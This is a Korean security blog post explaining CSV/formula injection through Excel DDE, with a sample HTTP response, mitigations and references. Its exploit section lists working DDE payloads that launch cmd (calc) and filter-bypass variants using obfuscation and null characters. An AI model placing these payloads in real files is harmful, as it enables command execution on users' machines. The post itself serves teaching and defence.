---
layout: post
title: CSV Injection
subtitle: Dynamic Data Exchange를 활용한 악성 CSV File 생성
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - Excel
  - CSV
  - DDE
  - Formula_Injection
sidebar:
---
## Intro
>🚨
>현재는 사용자가 DDE 작동 허용 설정을 하더라도 DDE가 포함된 CSV 파일을 열 때, Excel 경고창이 나타도록 되어있어 사회 공학적 요소도 필요한 공격 방법입니다.

Formula Injection 취약점 내 한 종류로 분류되는 CSV Injection은 일반적으로 CSV Export 등과 같은 CSV File Download 기능에서 발생됩니다.   
☑️간혹 잘못된 로직으로 .xlsx 생성 시에 발생하기도 합니다.   

발생 원리는 DDE(Dynamic Data Exchange)라는 Window 운영체제에서 응용 프로그램 간 데이터 전송을 위해 사용되는 기능이 악의적으로 작동됨에 기반합니다.   

운영체제 명령어를 실행시킬 수 있다는 점에서 위험한 취약점이지만, 많은 조건들이 갖춰져야만 실제 공격이 가능하여 일부 버그바운티 프로그램에서는 받아들여지지 않는 취약점 입니다.  
![](/assets/images/posts/2024-12-04-CSV-Injection/551c0cb564a1e3e7da206410c576583b_MD5.jpeg)
하지만, 악성 DDE를 삽입하는 과정이 단순하며 서비스 특성 상 사용자가 해당 파일을 신뢰하는 상황이라면 위험도는 높습니다. 그 예로 

## Detect & Exploit 
### Detect
사용자 입력 값이 CSV File Download 시 반영되는 지 확인하고, 악성 DDE를 동작시킬 수 있는 특수문자(`-`, `+`, `@`, `=` )가 Cell 가장 앞 부분에 위치할 수 있는 지 확인하면 됩니다.   
```Packet
#Request
GET /api/csv_export HTTP/2
Host: victim.com

#Response
HTTP/2 200 OK

title
=2+5+cmd|' /C calc'!A0
```

### Exploit
탐지한 부분에 악성 DDE를 삽입 후 다운로드하여 작동 여부를 살펴보면 됩니다.
```Excel
#Basic Payload
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'

#Prefix obfuscation and command chaining
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

#Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```
## Security Measures
악성 DDE를 동작시킬 수 있는 특수문자(`-`, `+`, `@`, `=` )가 Cell 가장 앞부분에 위치할 수 없도록 `Space`, `'` 등을 가장 앞에 삽입하여 조치하면 됩니다.
```Excel
'=2+5+cmd|' /C calc'!A0
 =cmd|' /C calc'!'A1'
```
## References
[Formula/CSV/Doc/LaTeX/GhostScript Injection](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection)   
[OWASP-CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)   
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)